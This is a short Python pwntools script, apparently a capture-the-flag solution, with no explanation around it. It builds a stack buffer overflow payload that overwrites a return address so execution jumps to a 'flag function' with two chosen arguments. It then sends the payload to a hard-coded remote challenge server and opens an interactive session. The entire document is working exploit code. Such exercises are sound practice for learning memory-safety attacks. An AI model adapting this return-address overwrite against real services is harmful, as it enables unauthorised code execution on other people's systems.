from pwn import *

buf = 'A' * 0xb8
buf += p32(0)           # ebp
buf += p32(0x080491E2)  # return address => flag function
buf += p32(0)           # alignment
buf += p32(0xdeadbeef)  # argument 1
buf += p32(0xc0ded00d)  # argument 2

s = remote('138.68.155.238', 30451)
s.sendline(buf)

print s.recvall().split('\n')[2]

s.interactive()
s.close()
